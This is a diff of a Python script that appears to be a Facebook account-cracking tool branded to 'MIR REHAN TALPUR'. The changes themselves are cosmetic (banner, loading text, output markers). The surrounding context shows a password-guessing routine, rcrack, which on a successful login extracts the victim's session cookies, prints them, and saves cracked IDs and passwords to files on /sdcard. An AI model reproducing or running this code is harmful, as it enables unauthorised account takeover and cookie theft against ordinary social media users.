@@ -93,7 +93,7 @@ logo =                                          ("""
 \033[1;33m   88    88    88  88o  obY'    88    
 \033[1;32m   88    88    88  88.`8b       88    
 \033[1;32m   88    88    88  88  `88.     88    
-\033[1;33m   YP    YP    YP  88    YD     YP V1.0         
+\033[1;33m   YP    YP    YP  88    YD     YP \033[1;39mV1.0🔥      
 
 \033[1;33m============================================
 \033[1;32m     \033[1;32mFACEBOOK     : \033[1;33m MIR REHAN TALPUR
@@ -123,7 +123,7 @@ else:
     
     
 try:
-    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
+    print('\n\n\033[1;33mMRT Loading ... \033[0;97m')
     v = 5.2
     update = ('5.2')
     update = ('5.2')
@@ -255,7 +255,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m(REHAN-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('\r\r\033[1;32m[REHAN-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/REHAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
@@ -263,7 +263,7 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\r\r\33[1;30m(REHAN-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                print('\r\r\33[1;33m[REHAN-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/REHAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
